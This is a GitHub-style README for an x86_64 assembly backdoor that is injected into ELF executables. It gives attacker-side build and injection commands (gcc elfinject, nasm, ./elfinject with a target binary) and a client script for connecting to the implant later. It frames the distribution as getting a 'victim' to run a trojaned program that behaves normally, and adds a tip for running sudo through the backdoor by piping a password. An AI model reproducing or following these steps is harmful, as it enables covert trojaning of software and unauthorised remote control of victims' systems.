# elf_backdoor

It is elf backdoor written in pure assembly language that works in **x86_64**

# Usage
## Attacker
First, in the backdoor/backdoor.s file,

you need to modify the statement `push 0x4049a0 ; jump to entrypoint` **to the original entry point of the target binary.**
### backdoor
```bash
$ gcc elfinject.c -o elfinject -lelf
$ nasm -f bin backdoor.s -o backdoor.bin
$ ./elfinject elftarget backdoor.bin ".injected" 0x800000 0
```
### backdoor_client
```
$ python3 tcpClient.py
```
## victim
If the victim downloads or acquires the file in any manner.
```
$ ./elftarget
```
The victim successfully uses the original program without any issues, but later, attackers exploit backdoors.

# Demo
## backdoor
![backdoor](https://github.com/gbdngb12/Simple-elf-backdoor/assets/104804087/84720f5f-7caf-45aa-b28a-00632b779317)

## backdoor_client
![client](https://github.com/gbdngb12/Simple-elf-backdoor/assets/104804087/29cf4cf6-bf88-456f-8cc2-052c8ae33f0c)

# Tips
## How to use sudo
```bash
$ python3 tcpClient
echo "password" | sudo -S <command>
```
